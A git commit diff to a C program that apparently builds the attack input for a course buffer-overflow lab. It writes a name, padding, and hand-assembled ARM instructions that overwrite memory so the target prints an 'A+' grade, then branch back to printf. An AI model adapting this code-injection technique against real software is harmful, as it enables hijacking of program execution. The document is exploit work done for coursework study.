7176f059acd0149b35c6a1a154df6d3b14500c4c
ayluo <ayluo@princeton.edu>
2021-05-08 22:11:41 -0400

    asdf

--- createdataAplus.c
+++ createdataAplus.c
@@ -9,16 +9,19 @@ int main(void) {
    unsigned int mov, adr, strb, branch, adr2;
    unsigned long movLocation;
    psFile = fopen("dataAplus", "w");
-   fputs("Rolex",psFile);
-   putc('\0', psFile);
-   
-   fputs("A+",psFile);
-   putc('\0', psFile);
+   fputs("Rolex",psFile);   
 
-   for (i = 0; i < 15; i++)
+   for (i = 0; i < 7; i++)
       putc('\0', psFile);
 
-   mov = MiniAssembler_mov(1, 'p');
+   mov = MiniAssembler_mov(1, 'A');
+   adr = MiniAssembler_adr(0, 0x400960, 0x420068);
+   strb = MiniAssembler_strb(1,0);
+   fwrite(&mov, sizeof(unsigned int), 1, psFile);
+   fwrite(&adr, sizeof(unsigned int), 1, psFile);
+   fwrite(&strb, sizeof(unsigned int), 1, psFile);  
+
+   mov = MiniAssembler_mov(1, '+');
    adr = MiniAssembler_adr(0, 0x400961, 0x420074);
    strb = MiniAssembler_strb(1,0);
    fwrite(&mov, sizeof(unsigned int), 1, psFile);
@@ -27,7 +30,7 @@ int main(void) {
    
    /* printf parameters  */
    adr = MiniAssembler_adr(0, 0x400960, 0x42007c);
-   adr2 = MiniAssembler_adr(1, 0x42005e, 0x420080);
+   adr2 = MiniAssembler_mov(1, 0);
    branch = MiniAssembler_b(0x400874,0x420084);  
    movLocation = 0x420070; 
       
